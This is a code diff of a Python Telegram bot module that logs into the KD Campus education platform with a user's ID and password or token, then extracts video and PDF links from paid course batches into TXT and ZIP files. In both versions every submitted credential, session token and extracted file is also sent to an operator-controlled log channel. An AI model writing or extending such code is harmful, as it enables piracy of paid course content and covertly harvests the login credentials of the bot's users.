@@ -1,11 +1,10 @@
-
 from Extractor import app
 from pyrogram import filters
 import json
 import time
 import httpx
 import hashlib
-from config import PREMIUM_LOGS, join,BOT_TEXT,THUMB_URL
+from config import PREMIUM_LOGS, join, BOT_TEXT, THUMB_URL
 from datetime import datetime
 import pytz
 import asyncio
@@ -23,11 +22,8 @@ logger = logging.getLogger(__name__)
 # Constants
 TIMEOUT = 120
 API_KEY = "kdc123"
-THUMB_PATH = "thumb.jpg"  # Local path to save thumbnail
+THUMB_PATH = "thumb.jpg"
 
-india_timezone = pytz.timezone('Asia/Kolkata')
-current_time = datetime.now(india_timezone)
-time_new = current_time.strftime("%d-%m-%Y %I:%M %p")
 
 @app.on_message(filters.command(["kd"]))
 async def kdlive(app, m):
@@ -37,16 +33,18 @@ async def kdlive(app, m):
     except Exception as e:
         logger.error(f"Error in kdlive: {e}")
         await m.reply_text(
-            "❌ <b>An error occurred</b>\n\n"
-            f"Error details: <code>{str(e)}</code>\n\n"
-            "Please try again or contact support."
+            "<blockquote>❌ <b>An error occurred</b>\n\n"
+            f"<b>Details:</b> <code>{str(e)}</code>\n"
+            "<i>Please check your credentials or try again later.</i></blockquote>",
+            parse_mode=ParseMode.HTML
         )
+
 
 async def download_thumbnail():
     """Download thumbnail image if not already downloaded"""
     if not os.path.exists(THUMB_PATH):
         try:
-            response = requests.get(THUMB_URL)
+            response = requests.get(THUMB_URL, timeout=10)
             if response.status_code == 200:
                 with open(THUMB_PATH, 'wb') as f:
                     f.write(response.content)
@@ -57,36 +55,38 @@ async def download_thumbnail():
             return None
     return THUMB_PATH
 
+
 async def extract(app, m, appname):
     try:
         start_time = time.time()
         
-        # Initial message
+        # Initial login prompt
         editable = await m.reply_text(
-            "🔹 <b>KD CAMPUS EXTRACTOR PRO</b> 🔹\n\n"
-            "Send login details in one of these formats:\n"
-            "1️⃣ <b>ID*Password:</b> <code>ID*Password</code>\n"
-            "2️⃣ <b>Token:</b> <code>your_token</code>\n\n"
+            f"<blockquote>⚡ <b>{appname.upper()} EXTRACTOR</b> ⚡\n\n"
+            "<b>Send your login details:</b>\n"
+            "• <b>Format 1:</b> <code>ID*Password</code>\n"
+            "• <b>Format 2:</b> <code>Token</code>\n\n"
             "<i>Example:</i>\n"
-            "- ID*Pass: <code>6969696969*password123</code>\n"
-            "- Token: <code>abcdef123456</code>",
+            "<code>9876543210*password123</code></blockquote>",
             parse_mode=ParseMode.HTML
         )
         
         try:
             input1 = await app.listen(m.chat.id, timeout=TIMEOUT)
             await forward_to_log(input1, "KD Live Extractor")
-            id_password = input1.text
+            id_password = input1.text.strip()
             await input1.delete()
         except asyncio.TimeoutError:
-            await editable.edit_text("⚠️ <b>Timeout:</b> No response received. Please try again...", parse_mode=ParseMode.HTML)
+            await editable.edit_text(
+                "<blockquote>⚠️ <b>Timeout:</b> No response received in time. Please start again.</blockquote>",
+                parse_mode=ParseMode.HTML
+            )
             return
             
         # Process login
-        async with httpx.AsyncClient() as client:
+        async with httpx.AsyncClient(timeout=30.0) as client:
             try:
                 if '*' in id_password:
-                    # ID*Password login
                     mob, pwd = id_password.split('*', 1)
                     password = hashlib.sha512(pwd.encode()).hexdigest()
                     payload = {
@@ -109,10 +109,10 @@ async def extract(app, m, appname):
                         headers=headers
                     )).json()
                     
-                    if 'data' not in resp:
+                    if 'data' not in resp or not resp['data']:
                         await editable.edit_text(
-                            "❌ <b>Login Failed</b>\n\n"
-                            "Please check your credentials and try again.",
+                            "<blockquote>❌ <b>Authentication Failed</b>\n\n"
+                            "Invalid credentials or account does not exist.</blockquote>",
                             parse_mode=ParseMode.HTML
                         )
                         return
@@ -121,25 +121,23 @@ async def extract(app, m, appname):
                     token = user_data['connection_key']
                     userid = user_data['id']
                 else:
-                    # Direct token login
                     token = id_password
-                    # Get user ID from token validation
                     try:
                         validate_resp = (await client.get(
                             f'https://web.kdcampus.live/android/Dashboard/get_mycourse_data_renew_new/{token}/0/4'
                         )).json()
                         if not validate_resp:
                             await editable.edit_text(
-                                "❌ <b>Invalid Token</b>\n\n"
-                                "Please check your token and try again.",
+                                "<blockquote>❌ <b>Invalid Token</b>\n\n"
+                                "Your session token is expired or incorrect.</blockquote>",
                                 parse_mode=ParseMode.HTML
                             )
                             return
-                        userid = "0"  # Using default user ID since token is valid
-                    except Exception as e:
+                        userid = "0"
+                    except Exception:
                         await editable.edit_text(
-                            "❌ <b>Invalid Token</b>\n\n"
-                            "Please check your token and try again.",
+                            "<blockquote>❌ <b>Invalid Token</b>\n\n"
+                            "Failed to authenticate with the provided token.</blockquote>",
                             parse_mode=ParseMode.HTML
                         )
                         return
@@ -149,35 +147,38 @@ async def extract(app, m, appname):
                     f'https://web.kdcampus.live/android/Dashboard/get_mycourse_data_renew_new/{token}/{userid}/4'
                 )).json()
                 
-                if not resp:
-                    await editable.edit_text("❌ No courses found in your account.", parse_mode=ParseMode.HTML)
+                if not resp or not isinstance(resp, list):
+                    await editable.edit_text(
+                        "<blockquote>❌ <b>No Courses Found</b>\n\n"
+                        "No active subscriptions found for this account.</blockquote>",
+                        parse_mode=ParseMode.HTML
+                    )
                     return
                     
-                # Format batch information
                 batch_list = ""
                 batch_ids = []
                 batch_data = []
                 
                 for item in resp:
-                    course_id = item['course_id']
-                    batch_id = item['batch_id']
+                    course_id = str(item['course_id'])
+                    batch_id = str(item['batch_id'])
                     name = item['batch_name']
-                    price = "N/A"  # or item.get('price', 'N/A') if price exists
-                    image = f"http://kdcampus.live/uploaded/landing_images/{item['banner_image_name']}"
+                    image = f"http://kdcampus.live/uploaded/landing_images/{item.get('banner_image_name', '')}"
                     
-                    batch_list += f"<code>{batch_id}_{course_id}</code> - <b>{name}</b> 💰\n\n"
+                    batch_list += f"▫️ <code>{batch_id}_{course_id}</code> ➔ <b>{name}</b>\n"
                     batch_ids.append(f"{batch_id}_{course_id}")
                     batch_data.append({
-                        'id': str(course_id),
-                        'batch_id': str(batch_id),
+                        'id': course_id,
+                        'batch_id': batch_id,
                         'name': name,
                         'image': image
                     })
                 
-                # Send login success message
+                # Send aesthetic login success & batches list
                 await editable.edit_text(
-                    f"✅ <b>{appname} Login Successful</b>\n\n"
-                    f"🆔 <b>Credentials:</b> <code>{id_password}</code>\n\n"
+                    f"<blockquote>✅ <b>Login Successful — {appname}</b>\n\n"
+                    f"🔑 <b>Credentials:</b> <code>{id_password}</code>\n"
+                    f"📦 <b>Total Batches:</b> <code>{len(batch_data)}</code></blockquote>\n"
                     f"📚 <b>Available Batches:</b>\n\n{batch_list}",
                     parse_mode=ParseMode.HTML
                 )
@@ -185,19 +186,20 @@ async def extract(app, m, appname):
                 # Log to premium channel
                 await app.send_message(
                     PREMIUM_LOGS,
-                    f"✅ <b>New Login - {appname}</b>\n"
-                    f"🆔 <code>{id_password}</code>\n"
-                    f"🔑 Token: <code>{token}</code>\n\n"
-                    f"📚 Batches:\n{batch_list}",
+                    f"<blockquote>🌟 <b>New Login Session — {appname}</b>\n\n"
+                    f"👤 <b>Input:</b> <code>{id_password}</code>\n"
+                    f"🔑 <b>Token:</b> <code>{token}</code></blockquote>\n\n"
+                    f"📚 <b>Available Batches:</b>\n{batch_list}",
                     parse_mode=ParseMode.HTML
                 )
                 
-                # Ask for batch selection
+                # Batch ID request prompt
                 input2 = await app.ask(
                     m.chat.id,
-                    f"<b>📥 Send the Batch ID to download</b>\n\n"
-                    f"<b>💡 For ALL batches:</b> <code>{','.join(batch_ids)}</code>\n\n"
-                    f"<i>Supports multiple IDs separated by comma</i>",
+                    "<blockquote>📥 <b>BATCH SELECTION</b>\n\n"
+                    "Send the <b>Batch ID</b> you want to extract.\n"
+                    "<i>To extract multiple batches, separate them with commas.</i>\n\n"
+                    f"💡 <b>All Batches:</b> <code>{','.join(batch_ids)}</code></blockquote>",
                     parse_mode=ParseMode.HTML
                 )
                 
@@ -206,38 +208,41 @@ async def extract(app, m, appname):
                 await editable.delete()
 
                 if not selected_ids:
-                    await m.reply_text("❌ No valid batch IDs provided.", parse_mode=ParseMode.HTML)
+                    await m.reply_text("<blockquote>❌ <b>No valid Batch IDs provided.</b></blockquote>", parse_mode=ParseMode.HTML)
                     return
                 
-                # Process each selected batch
+                # Process each batch
                 for batch_id in selected_ids:
                     if '_' not in batch_id:
-                        await m.reply_text(f"❌ Invalid batch ID format: {batch_id}\nExpected format: batchID_courseID", parse_mode=ParseMode.HTML)
+                        await m.reply_text(
+                            f"<blockquote>❌ <b>Invalid ID Format:</b> <code>{batch_id}</code>\n"
+                            "Expected: <code>batchID_courseID</code></blockquote>",
+                            parse_mode=ParseMode.HTML
+                        )
                         continue
                         
                     progress_msg = await m.reply_text(
-                        "🔄 <b>Processing Large Batch</b>\n"
-                        f"└─ Initializing batch: <code>{batch_id}</code>",
+                        "<blockquote>🔄 <b>Initializing Extraction...</b>\n"
+                        f"🎯 <b>Target Batch:</b> <code>{batch_id}</code></blockquote>",
                         parse_mode=ParseMode.HTML
                     )
                     
                     try:
-                        bid, ccid = batch_id.split('_')
+                        bid, ccid = batch_id.split('_', 1)
                         batch_info = next((b for b in batch_data if b['batch_id'] == bid and b['id'] == ccid), None)
                         
                         if not batch_info:
                             await progress_msg.edit_text(
-                                f"❌ <b>Invalid batch ID: {batch_id}</b>\n"
-                                "Please check the batch ID and try again.",
+                                f"<blockquote>❌ <b>Batch Not Found:</b> <code>{batch_id}</code>\n"
+                                "Please verify the ID and try again.</blockquote>",
                                 parse_mode=ParseMode.HTML
                             )
                             continue
 
-                        # Initialize content storage
                         all_urls = []
                         topic_wise_content = {}
                         
-                        # Fetch subjects with error handling
+                        # Fetch subjects
                         try:
                             subjects_response = await client.get(
                                 f"https://web.kdcampus.live/android/Dashboard/course_subject/{token}/{userid}/{ccid}/{bid}"
@@ -246,8 +251,8 @@ async def extract(app, m, appname):
                             
                             if 'subjects' not in subjects_data or not subjects_data['subjects']:
                                 await progress_msg.edit_text(
-                                    f"❌ <b>No subjects found for batch: {batch_id}</b>\n"
-                                    "This batch might be empty or inaccessible.",
+                                    f"<blockquote>❌ <b>No Subjects Found</b>\n\n"
+                                    f"Batch: <b>{batch_info['name']}</b> is empty or unavailable.</blockquote>",
                                     parse_mode=ParseMode.HTML
                                 )
                                 continue
@@ -255,8 +260,7 @@ async def extract(app, m, appname):
                             subjects = subjects_data['subjects']
                         except Exception as e:
                             await progress_msg.edit_text(
-                                f"❌ <b>Error fetching subjects for batch {batch_id}:</b>\n"
-                                f"Error: <code>{str(e)}</code>",
+                                f"<blockquote>❌ <b>Failed to fetch subjects:</b>\n<code>{str(e)}</code></blockquote>",
                                 parse_mode=ParseMode.HTML
                             )
                             continue
@@ -265,23 +269,30 @@ async def extract(app, m, appname):
                         processed = 0
                         total_videos = 0
                         total_pdfs = 0
+                        last_edit = 0
                         
                         for subject in subjects:
                             sid = subject['id']
                             subject_name = subject['subject_name']
                             subject_content = []
                             
-                            await progress_msg.edit_text(
-                                f"🔄 <b>Processing Large Batch</b>\n"
-                                f"├─ Batch: <code>{batch_info['name']}</code>\n"
-                                f"├─ Progress: {processed}/{total_subjects} subjects\n"
-                                f"├─ Videos: {total_videos}\n"
-                                f"├─ PDFs: {total_pdfs}\n"
-                                f"└─ Current: <code>{subject_name}</code>",
-                                parse_mode=ParseMode.HTML
-                            )
+                            # Aesthetic extracting progress message (Throttled to avoid Telegram FloodWait)
+                            if time.time() - last_edit > 2.5:
+                                try:
+                                    await progress_msg.edit_text(
+                                        f"<blockquote>⚡ <b>EXTRACTING BATCH CONTENT</b>\n\n"
+                                        f"📚 <b>Batch:</b> <code>{batch_info['name']}</code>\n"
+                                        f"📖 <b>Subject:</b> <code>{subject_name}</code>\n"
+                                        f"📊 <b>Progress:</b> [{processed}/{total_subjects}]\n"
+                                        f"🎬 <b>Videos Found:</b> <code>{total_videos}</code>\n"
+                                        f"📄 <b>PDFs Found:</b> <code>{total_pdfs}</code></blockquote>",
+                                        parse_mode=ParseMode.HTML
+                                    )
+                                    last_edit = time.time()
+                                except Exception:
+                                    pass
                             
-                            # Fetch videos with error handling
+                            # Fetch Videos
                             try:
                                 videos_response = await client.get(
                                     f"https://web.kdcampus.live/android/Dashboard/course_details_video/{token}/{userid}/{ccid}/{bid}/0/{sid}/0"
@@ -293,14 +304,14 @@ async def extract(app, m, appname):
                                         title = video.get('content_title', '').strip()
                                         url = video.get('jwplayer_id', '')
                                         if title and url:
-                                            url = "https://" + url
+                                            url = "https://" + url if not url.startswith("http") else url
                                             all_urls.append(f"{title}: {url}")
                                             subject_content.append(f"🎬 {title}\n{url}")
                                             total_videos += 1
                             except Exception as e:
                                 logger.error(f"Error fetching videos for subject {subject_name}: {e}")
                                 
-                            # Fetch PDFs with error handling
+                            # Fetch PDFs
                             try:
                                 pdfs_response = await client.get(
                                     f"https://web.kdcampus.live/android/Dashboard/course_details_pdf/{token}/{userid}/{ccid}/{bid}/0/{sid}/0"
@@ -326,23 +337,23 @@ async def extract(app, m, appname):
                             
                         if not all_urls:
                             await progress_msg.edit_text(
-                                f"❌ <b>No content found in batch: {batch_info['name']}</b>\n"
-                                "This batch might be empty or all content might be inaccessible.",
+                                f"<blockquote>❌ <b>No content links found</b> in batch: <b>{batch_info['name']}</b></blockquote>",
                                 parse_mode=ParseMode.HTML
                             )
                             continue
                             
-                        # Create files
+                        # File preparations
                         batch_name = batch_info['name']
                         timestamp = int(time.time())
-                        txt_filename = f"KD_{batch_name}_{timestamp}.txt"
-                        zip_filename = f"KD_{batch_name}_{timestamp}_topics.zip"
+                        safe_batch = "".join(x for x in batch_name if x.isalnum() or x in (' ', '-', '_')).strip()
+                        txt_filename = f"KD_{safe_batch}_{timestamp}.txt"
+                        zip_filename = f"KD_{safe_batch}_{timestamp}_topics.zip"
                         
-                        # Save simple URL list
+                        # Save single TXT
                         with open(txt_filename, 'w', encoding='utf-8') as f:
                             f.write('\n'.join(all_urls))
                             
-                        # Create topic-wise ZIP
+                        # Save ZIP by topics
                         try:
                             import zipfile
                             with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
@@ -353,99 +364,86 @@ async def extract(app, m, appname):
                         except Exception as e:
                             logger.error(f"Error creating ZIP: {e}")
                             
-                        # Count content types
+                        # Count stats
                         video_count = sum(1 for url in all_urls if any(ext in url.lower() for ext in ['.mp4', '.m3u8', '.mpd', 'youtu.be', 'youtube.com', '/videos/', '/video/']))
                         pdf_count = sum(1 for url in all_urls if '.pdf' in url.lower())
                         other_count = len(all_urls) - (video_count + pdf_count)
                         
-                        # Calculate stats and format caption
                         duration = time.time() - start_time
                         minutes, seconds = divmod(duration, 60)
+                        now_ist = datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%d-%b-%Y • %I:%M %p')
+                        bot_username = (await app.get_me()).username
                         
+                        # Aesthetic Blockquote Caption Report
                         caption = (
-                            f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
-                            f"📱 <b>APP:</b> {appname}\n"
-                            f"📚 <b>BATCH:</b> {batch_name} (ID: {batch_id})\n"
-                            f"⏱ <b>EXTRACTION TIME:</b> {int(minutes):02d}:{int(seconds):02d}\n"
-                            f"📅 <b>DATE:</b> {datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%d-%m-%Y %H:%M:%S')} IST\n\n"
-                            f"📊 <b>CONTENT STATS</b>\n"
-                            f"├─ 📁 Total Links: {len(all_urls)}\n"
-                            f"├─ 🎬 Videos: {video_count}\n"
-                            f"├─ 📄 PDFs: {pdf_count}\n"
-                            f"├─ 📦 Others: {other_count}\n"
-                            f"└─ 📚 Topics: {len(topic_wise_content)}\n\n"
-                            f"🚀 <b>Extracted by:</b> @{(await app.get_me()).username}\n\n"
-                            f"<code>╾───• {BOT_TEXT} •───╼</code>"
+                            f"<blockquote>🎓 <b>EXTRACTION REPORT</b> 🎓\n\n"
+                            f"📱 <b>Platform:</b> <code>{appname}</code>\n"
+                            f"📚 <b>Batch Name:</b> <code>{batch_name}</code>\n"
+                            f"🆔 <b>Batch ID:</b> <code>{batch_id}</code>\n"
+                            f"⏱ <b>Time Taken:</b> <code>{int(minutes):02d}m {int(seconds):02d}s</code>\n"
+                            f"📅 <b>Extracted On:</b> <code>{now_ist} IST</code>\n\n"
+                            f"📊 <b>CONTENT SUMMARY:</b>\n"
+                            f"├ 📁 <b>Total Files:</b> <code>{len(all_urls)}</code>\n"
+                            f"├ 🎬 <b>Videos:</b> <code>{video_count}</code>\n"
+                            f"├ 📄 <b>PDFs:</b> <code>{pdf_count}</code>\n"
+                            f"├ 📦 <b>Others:</b> <code>{other_count}</code>\n"
+                            f"└ 📑 <b>Subjects:</b> <code>{len(topic_wise_content)}</code>\n\n"
+                            f"⚡ <b>Extracted by:</b> @{bot_username}\n"
+                            f"╾────────────────────╼\n"
+                            f"✦ <i>{BOT_TEXT}</i> ✦</blockquote>"
                         )
                         
-                        # Send initialization message
-                        status_msg = await m.reply_text(
-                            "🔄 <b>Processing Large Batch</b>\n"
-                            "├─ Initializing extraction...\n"
-                            "└─ Please wait...",
-                            parse_mode=ParseMode.HTML
-                        )
-
                         try:
-                            # Download thumbnail
                             thumb_path = await download_thumbnail()
                             
-                            # Send simple txt file
+                            # Send TXT Document
                             await app.send_document(
                                 m.chat.id,
                                 document=txt_filename,
-                                caption=f"{caption}\n\n💡 This file contains simple URL list",
+                                caption=f"{caption}\n\n📄 <i>Complete Batch URL List</i>",
                                 thumb=thumb_path if thumb_path else None,
                                 parse_mode=ParseMode.HTML
                             )
-                            await app.send_document(
-                                PREMIUM_LOGS,
-                                document=txt_filename,
-                                caption=caption,
-                                thumb=thumb_path if thumb_path else None,
-                                parse_mode=ParseMode.HTML
-                            )
-                            
-                            # Send zip file if it exists
-                            if os.path.exists(zip_filename):
-                                await app.send_document(
-                                    m.chat.id,
-                                    document=zip_filename,
-                                    caption=f"{caption}\n\n💡 This ZIP contains topic-wise content",
-                                    thumb=thumb_path if thumb_path else None,
-                                    parse_mode=ParseMode.HTML
-                                )
+                            if PREMIUM_LOGS:
                                 await app.send_document(
                                     PREMIUM_LOGS,
-                                    document=zip_filename,
+                                    document=txt_filename,
                                     caption=caption,
                                     thumb=thumb_path if thumb_path else None,
                                     parse_mode=ParseMode.HTML
                                 )
                                 
-                            # Final status
-                            await status_msg.edit_text(
-                                "✅ <b>Extraction completed successfully!</b>\n\n"
-                                f"📊 <b>Final Status:</b>\n"
-                                f"├─ Processed: {total_subjects} subjects\n"
-                                f"├─ Total Links: {len(all_urls)}\n"
-                                f"└─ Files sent: ✅\n\n"
-                                f"Thank you for using {appname} Extractor! 🌟",
-                                parse_mode=ParseMode.HTML
-                            )
+                            # Send ZIP Document
+                            if os.path.exists(zip_filename):
+                                await app.send_document(
+                                    m.chat.id,
+                                    document=zip_filename,
+                                    caption=f"{caption}\n\n📦 <i>Subject-Wise Organized Topics</i>",
+                                    thumb=thumb_path if thumb_path else None,
+                                    parse_mode=ParseMode.HTML
+                                )
+                                if PREMIUM_LOGS:
+                                    await app.send_document(
+                                        PREMIUM_LOGS,
+                                        document=zip_filename,
+                                        caption=caption,
+                                        thumb=thumb_path if thumb_path else None,
+                                        parse_mode=ParseMode.HTML
+                                    )
+                                    
+                            await progress_msg.delete()
 
                         except Exception as e:
                             logger.error(f"Error sending files: {e}")
-                            await status_msg.edit_text(
-                                "❌ <b>Error sending files</b>\n\n"
-                                f"Error details: <code>{str(e)}</code>",
+                            await progress_msg.edit_text(
+                                f"<blockquote>❌ <b>Error Dispatching Files:</b>\n<code>{str(e)}</code></blockquote>",
                                 parse_mode=ParseMode.HTML
                             )
                             
                         finally:
-                            # Cleanup
                             try:
-                                os.remove(txt_filename)
+                                if os.path.exists(txt_filename):
+                                    os.remove(txt_filename)
                                 if os.path.exists(zip_filename):
                                     os.remove(zip_filename)
                             except Exception as e:
@@ -454,27 +452,21 @@ async def extract(app, m, appname):
                     except Exception as e:
                         logger.error(f"Error processing batch {batch_id}: {e}")
                         await progress_msg.edit_text(
-                            "❌ <b>An error occurred during extraction</b>\n\n"
-                            f"Error details: <code>{str(e)}</code>\n\n"
-                            "Please try again or contact support.",
+                            f"<blockquote>❌ <b>Extraction Failure:</b>\n<code>{str(e)}</code></blockquote>",
                             parse_mode=ParseMode.HTML
                         )
                         
             except Exception as e:
                 logger.error(f"Error in login process: {e}")
                 await editable.edit_text(
-                    "❌ <b>Login Failed</b>\n\n"
-                    f"Error details: <code>{str(e)}</code>\n\n"
-                    "Please check your credentials and try again.",
+                    f"<blockquote>❌ <b>Authentication Failure:</b>\n<code>{str(e)}</code></blockquote>",
                     parse_mode=ParseMode.HTML
                 )
                 
     except Exception as e:
         logger.error(f"Error in extract: {e}")
         await m.reply_text(
-            "❌ <b>An error occurred</b>\n\n"
-            f"Error details: <code>{str(e)}</code>\n\n"
-            "Please try again or contact support.",
+            f"<blockquote>❌ <b>Unexpected Error Occurred:</b>\n<code>{str(e)}</code></blockquote>",
             parse_mode=ParseMode.HTML
         )
         
